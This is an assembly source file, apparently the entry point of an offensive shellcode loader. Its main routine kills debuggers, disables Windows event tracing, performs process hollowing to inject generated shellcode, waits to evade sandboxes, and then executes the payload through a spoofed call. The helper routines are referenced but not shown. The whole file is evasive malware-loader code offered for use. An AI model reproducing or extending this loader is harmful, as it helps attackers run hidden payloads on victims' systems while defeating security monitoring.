;----------------------------------------------------;
; Author	=> Abdallah Mohamed (@0xNinjaCyclone)    ;
; Email		=> elsharifabdallah53@gmail.com          ;
; Date		=> September 01, 2025                    ;
;----------------------------------------------------;

include shellcode.asm

IFNDEF SHELLCODE
	.ERR <"Run `generate.py` and rebuild again -_-">
ENDIF

include evader.inc

.data

extern szNtdll:word
extern szK32:word

public hNtDll 
hNtDll qword ?
public pProcEnvBlock
pProcEnvBlock qword ?
public dwProcId
dwProcId dword 00h
public dwThreadId
dwThreadId dword 00h
public hThread
hThread qword 00h

.code

extern hollow:proc
extern f_ckoff_etw:proc
extern ldr_exit:proc
extern fake_workload:proc
extern start_fake_workload:proc
extern calm_before_storm:proc

AsmLdr proc
	INIT_ASMLDR
	KILL_DEBUGGERS
	call f_ckoff_etw
    call hollow
	test rax, rax
	jz ldr_finish
	push rax
	call calm_before_storm
	call SpoofCall
	ldr_finish:
	ret
AsmLdr endp

end